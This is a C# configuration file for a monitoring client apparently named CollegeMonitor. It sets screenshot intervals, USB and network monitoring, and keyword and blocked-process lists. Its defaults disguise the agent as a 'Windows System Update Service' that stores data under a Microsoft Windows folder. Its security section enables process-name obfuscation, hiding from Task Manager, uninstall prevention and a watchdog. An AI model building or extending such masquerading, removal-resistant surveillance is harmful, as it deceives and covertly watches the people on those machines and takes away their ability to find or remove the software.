namespace CollegeMonitor.Client.Configuration;

/// <summary>
/// Service configuration
/// </summary>
public class ServiceConfig
{
    public string Name { get; set; } = "WinSysUpdate";
    public string DisplayName { get; set; } = "Windows System Update Service";
    public string Description { get; set; } = "Manages Windows system updates and security health monitoring";
    public string ServiceName { get; set; } = "WinSysUpdate";
}

/// <summary>
/// Server connection configuration
/// </summary>
public class ServerConfig
{
    public string BaseUrl { get; set; } = "https://monitor.college.edu/api";
    public string WebSocketUrl { get; set; } = "wss://monitor.college.edu/ws";
    public string ApiKey { get; set; } = string.Empty;
    public string ClientCertificatePath { get; set; } = string.Empty;
    public string ClientCertificatePassword { get; set; } = string.Empty;
    public bool ValidateServerCertificate { get; set; } = true;
    public int ConnectionTimeoutSeconds { get; set; } = 30;
    public int ReconnectIntervalSeconds { get; set; } = 60;
    public int MaxReconnectAttempts { get; set; } = 10;
}

/// <summary>
/// Monitoring configuration
/// </summary>
public class MonitoringConfig
{
    public int HeartbeatIntervalSeconds { get; set; } = 30;
    public int ScreenshotIntervalSeconds { get; set; } = 300;
    public int MaxScreenshotsPerHour { get; set; } = 50;
    public bool CaptureOnWindowChange { get; set; } = true;
    public bool CaptureOnTrigger { get; set; } = true;
    public List<string> SuspiciousKeywords { get; set; } = new();
    public List<string> BlockedProcesses { get; set; } = new();
    public List<string> BlockedUrls { get; set; } = new();
    public bool MonitorUsb { get; set; } = true;
    public bool MonitorClipboard { get; set; } = false;
    public bool MonitorPrintJobs { get; set; } = false;
    public bool MonitorNetworkConnections { get; set; } = true;
    public int FailedLoginThreshold { get; set; } = 3;
    public int FailedLoginWindowMinutes { get; set; } = 15;
    public int RiskScoreAlertThreshold { get; set; } = 50;
}

/// <summary>
/// Storage configuration
/// </summary>
public class StorageConfig
{
    public string LocalDbPath { get; set; } = @"C:\ProgramData\Microsoft\Windows\WinSysUpdate\monitor.db";
    public string ScreenshotPath { get; set; } = @"C:\ProgramData\Microsoft\Windows\WinSysUpdate\screenshots\";
    public int MaxLocalStorageMB { get; set; } = 500;
    public int ScreenshotRetentionDays { get; set; } = 30;
    public int ActivityLogRetentionDays { get; set; } = 90;
    public bool CompressScreenshots { get; set; } = true;
    public int ScreenshotQuality { get; set; } = 80;
}

/// <summary>
/// Security configuration
/// </summary>
public class SecurityConfig
{
    public bool EncryptLocalDb { get; set; } = true;
    public bool EncryptScreenshots { get; set; } = true;
    public bool EncryptNetworkPayloads { get; set; } = true;
    public bool ObfuscateProcessName { get; set; } = true;
    public bool HideFromTaskManager { get; set; } = true;
    public bool PreventUninstall { get; set; } = true;
    public bool WatchdogEnabled { get; set; } = true;
    public int IntegrityCheckIntervalMinutes { get; set; } = 15;
}

/// <summary>
/// Logging configuration
/// </summary>
public class LoggingConfig
{
    public string LogLevel { get; set; } = "Information";
    public bool LogToEventLog { get; set; } = true;
    public bool LogToFile { get; set; } = false;
    public string LogFilePath { get; set; } = @"C:\ProgramData\Microsoft\Windows\WinSysUpdate\logs\";
    public int MaxLogFileSizeMB { get; set; } = 10;
    public int MaxLogFiles { get; set; } = 5;
}